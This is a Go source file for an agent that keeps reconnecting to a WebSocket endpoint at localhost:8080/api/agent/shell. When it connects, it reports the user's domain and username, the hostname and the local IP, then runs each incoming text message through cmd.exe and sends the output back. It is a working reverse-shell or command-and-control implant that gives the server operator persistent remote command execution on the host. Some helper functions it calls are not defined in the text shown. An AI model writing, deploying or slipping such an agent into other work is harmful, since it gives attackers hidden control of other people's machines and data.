package main

import (
	"fmt"
	"github.com/gorilla/websocket"
	"golang.org/x/text/encoding/charmap"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

func Run() {
	infiniteConnection()
}

func infiniteConnection() {
	server := "ws://localhost:8080/api/agent/shell"
	for {
		connection, err := openWebSocketConnection(server)
		if err != nil {
			wait()
			continue
		}

		if err = sendAuth(connection); err != nil {
			fmt.Println(err)
			closeConn(connection)
			continue
		}
		fmt.Printf("Connection to %s established\n", server)
		handleMessages(connection)
		wait()
	}
}

func wait() {
	waitingSeconds := 30
	waiting := time.Duration(waitingSeconds) * time.Second
	fmt.Printf("WebSocket Session ended. Waiting %d seconds to reestablish connection.\n", waitingSeconds)
	time.Sleep(waiting)
}

func handleMessages(connection *websocket.Conn) {
	workingDirectory, err := os.UserHomeDir()
	if err != nil {
		workingDirectory = "C:\\"
		fmt.Printf("Cannot resolve home directory, falling back to %s", workingDirectory)
	}
	for {
		messageType, bytes, err := connection.ReadMessage()
		if err != nil {
			fmt.Println(err)
			break
		}
		switch messageType {
		case websocket.TextMessage:
			command := strings.TrimSpace(string(bytes))
			workingDirectory = resolveWorkingDirectory(workingDirectory, command)
			commandResult, err := executeCommand(workingDirectory, command)
			if err != nil {
				fmt.Println(err)
			}
			sendResult(connection, commandResult)
		case websocket.CloseMessage:
			fmt.Printf("Close frame with message: %s\n", string(bytes))
			break
		default:
			fmt.Printf("Not supported WS frame of type %d\n", messageType)
			break
		}
	}
}

func sendResult(connection *websocket.Conn, result string) {
	fmt.Printf("Sending command result: %s...\n", result)
	err := connection.WriteMessage(websocket.TextMessage, []byte(result))
	if err != nil {
		fmt.Printf("Could not send message: %s\n", result[:20])
	}
}

func resolveWorkingDirectory(
	currentWorkingDirectory string,
	command string,
) string {
	if strings.Index(command, "cd") < 0 {
		return currentWorkingDirectory
	}
	cdPath := strings.TrimSpace(command[2:])
	if filepath.IsAbs(cdPath) {
		return cdPath
	}
	if cdPath == ".." {
		return filepath.Dir(currentWorkingDirectory)
	}
	if cdPath == "~" || strings.ToLower(cdPath) == "%userprofile%" {
		home, _ := os.UserHomeDir()
		return home
	}
	return filepath.Join(currentWorkingDirectory, cdPath)
}

func executeCommand(workingDirectory string, command string) (string, error) {
	fmt.Printf("Executing command: %s %s\n", workingDirectory, command)
	parsedCommand := parseCommand(command)
	cmd := exec.Command(parsedCommand[0], parsedCommand[1:]...)
	cmd.Dir = workingDirectory
	output, err := cmd.CombinedOutput()
	if runtime.GOOS == "windows" {
		decoder := charmap.CodePage850.NewDecoder()
		output, err = decoder.Bytes(output)
	}
	resultStr := string(output)
	return fmt.Sprintf("%s> %s", workingDirectory, resultStr), err
}

func parseCommand(command string) []string {
	if command == "" {
		return nil
	}
	from := 0
	inQuotes := false
	skip := false
	result := make([]string, 0)
	result = append(result, "cmd.exe")
	result = append(result, "/c")
	length := len(command)
	for i := 0; i < length; i++ {
		ch := command[i]
		if skip {
			skip = false
		} else if ch == ' ' {
			if !inQuotes {
				result = append(result, command[from:i])
				from = i + 1
			}
		} else if ch == '"' {
			if inQuotes {
				inQuotes = false
				skip = true
				result = append(result, command[from:i])
				from = i + 2
			} else {
				inQuotes = true
				from = i + 1
			}
		} else if i+1 == length {
			result = append(result, command[from:length])
			from = i
		}
	}
	return result
}

func closeConn(
	connection *websocket.Conn,
) {
	if err := connection.Close(); err != nil {
		fmt.Println(err)
	}
}

func openWebSocketConnection(server string) (*websocket.Conn, error) {
	dialer := websocket.Dialer{
		Proxy:            http.ProxyFromEnvironment,
		HandshakeTimeout: 45 * time.Second,
	}
	conn, _, err := dialer.Dial(server, nil)
	if err != nil {
		fmt.Println(err)
		return nil, err
	}
	_ = conn.SetReadDeadline(time.Time{})
	_ = conn.SetWriteDeadline(time.Time{})
	return conn, nil
}

func sendAuth(connection *websocket.Conn) error {
	err := connection.WriteJSON(newGreeting())
	if err != nil {
		return err
	}
	return nil
}

type Agent struct {
	Name     string `json:"name"`
	HostName string `json:"hostName"`
	LocalIp  string `json:"localIp"`
}

func newGreeting() Agent {
	domainAndUserName, err := getDomainAndUserName()
	if err != nil {
		fmt.Printf("Cannot get domain and user name. %s", err.Error())
	}
	name, err := getHostName()
	if err != nil {
		fmt.Printf("Cannot get host name. %s", err.Error())
	}
	localIp, err := getLocalIp()
	if err != nil {
		fmt.Printf("Cannot get local IP. %s", err.Error())
	}
	return Agent{
		Name:     domainAndUserName,
		HostName: name,
		LocalIp:  localIp,
	}
}
